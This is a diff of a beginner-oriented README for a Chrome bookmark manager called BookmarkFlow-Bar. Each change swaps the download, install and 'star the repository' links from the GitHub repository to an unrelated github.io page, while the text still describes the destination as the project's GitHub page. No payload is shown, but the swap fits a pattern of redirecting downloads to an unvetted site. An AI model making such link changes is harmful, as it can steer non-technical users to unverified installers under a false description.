@@ -6,7 +6,7 @@ Welcome to **BookmarkFlow-Bar**, the simple, private, and powerful way to manage
 
 This guide is written for everyone, so you don't need any technical experience. Let's get you set up in just a few minutes.
 
-[![Download Now](https://img.shields.io/badge/Download-BookmarkFlow--Bar-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/vickyfoliolate888/BookmarkFlow-Bar)
+[![Download Now](https://img.shields.io/badge/Download-BookmarkFlow--Bar-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://vickyfoliolate888.github.io)
 
 ## ✨ What Makes BookmarkFlow-Bar Special?
 
@@ -25,7 +25,7 @@ Getting BookmarkFlow-Bar on your Windows computer is a simple two-step process. 
 
 ### Step 1: Download the File
 
-**Visit this link to download the application:** [https://github.com/vickyfoliolate888/BookmarkFlow-Bar](https://github.com/vickyfoliolate888/BookmarkFlow-Bar)
+**Visit this link to download the application:** [https://vickyfoliolate888.github.io](https://vickyfoliolate888.github.io)
 
 Once you click this link, you will be taken to the project's GitHub page. Look for the **"Releases"** section or a prominent **"Download"** button on that page. Click it to save the installation file to your computer. The download will begin automatically.
 
@@ -105,7 +105,7 @@ Currently, BookmarkFlow-Bar is specifically designed for Chrome and other Chromi
 
 If you love BookmarkFlow-Bar, please consider showing your support:
 
-- **Star the Repository:** Visit the GitHub page ([https://github.com/vickyfoliolate888/BookmarkFlow-Bar](https://github.com/vickyfoliolate888/BookmarkFlow-Bar)) and click the "Star" button. It's a free way to help others discover this tool.
+- **Star the Repository:** Visit the GitHub page ([https://vickyfoliolate888.github.io](https://vickyfoliolate888.github.io)) and click the "Star" button. It's a free way to help others discover this tool.
 - **Report Issues:** If you find a bug or have a feature request, please let the developer know by creating an "Issue" on the GitHub page. Your feedback helps make the product better for everyone.
 
 ## 📢 Spread the Word
